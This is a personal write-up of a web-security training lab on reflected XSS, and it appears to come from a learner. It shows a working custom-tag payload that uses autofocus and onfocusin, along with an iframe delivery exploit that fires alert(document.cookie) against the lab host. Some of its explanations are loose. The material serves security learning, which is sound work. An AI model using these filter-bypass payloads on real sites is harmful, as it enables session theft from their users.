# [XSS] LAB: Reflected XSS into HTML context with all tags blocked except custom ones (1)

---

![Untitled](%5BXSS%5D%20LAB%20Reflected%20XSS%20into%20HTML%20context%20with%20all%2056f8e64daa074319984983882168ae7f/Untitled.png)

so this lab is rejecting all tags but custom HTML tags we can see an example of this when we refer to <test> </test> and as you can see we were able to inject our own tags. 

![Untitled](%5BXSS%5D%20LAB%20Reflected%20XSS%20into%20HTML%20context%20with%20all%2056f8e64daa074319984983882168ae7f/Untitled%201.png)

one of the payload I tried but had no luck was something like this: 

```jsx
<test onresize="alert(1)"> </test>
```

but no luck 

using the XSS cheat sheet from burp suite and filtering by custom tags we can see a payload that requires no interaction 

```jsx
<xss autofocus tabindex=1 onfocusin=alert(1)></xss>
```

- `autofocus`: This attribute is a boolean attribute. When present, it specifies that an element should automatically get focus when the page loads. This means that as soon as the page is loaded, this element will be selected and ready for user input or interaction.
- `tabindex="1"`: This attribute specifies the tab order of an element (when the "tab" button is used for navigating). The value "1" means that this element is the first one to receive focus when tab navigation is used.
- `onfocusin=alert(1)`: This is an event attribute that specifies a script to run when an element is about to get focus. In this case, when the `<xss>` element is about to get focus, it triggers an alert dialog with the message "1".

the reason this one worked and mine didn’t is one of two reasons

1. onresize is only supported by window and iframe not elements 
2. the custom tag cannot be randomly given attributes without using a <script> </script> tag to define what those attributes do. 
    
    **Example:** 
    
    ```html
    <my-tag my-attribute="Hello, world!"></my-tag>
    
    <script>
        var myTag = document.querySelector('my-tag');
        console.log(myTag.getAttribute('my-attribute')); // Logs: "Hello, world!"
    </script>
    ```
    
    GPT EXPLANATION: 
    
    ![Untitled](%5BXSS%5D%20LAB%20Reflected%20XSS%20into%20HTML%20context%20with%20all%2056f8e64daa074319984983882168ae7f/Untitled%202.png)
    
    but since focus and tabindex is supported by all elements 
    
    more tags like autofocus: 
    
    ![Untitled](%5BXSS%5D%20LAB%20Reflected%20XSS%20into%20HTML%20context%20with%20all%2056f8e64daa074319984983882168ae7f/Untitled%203.png)
    
    and the **URL: <xss autofocus tabindex=1 onfocusin=alert(document.cook)></xss>**
    
    to Deliver the payload I can create an Iframe and just deliver it to the payload and it should work since the exploit require no user interaction. 
    
    so this is the iframe: 
    
    ```html
    <iframe src="about:blank" onload="window.location.href='https://0a20006e032792bb83f6014d00f4004f.web-security-academy.net/?search=%3Cxss+autofocus+onfocusin%3Dalert%28document.cookie%29+tabindex%3D1%3E%3C%2Fxss%3E';"> test</iframe>
    ```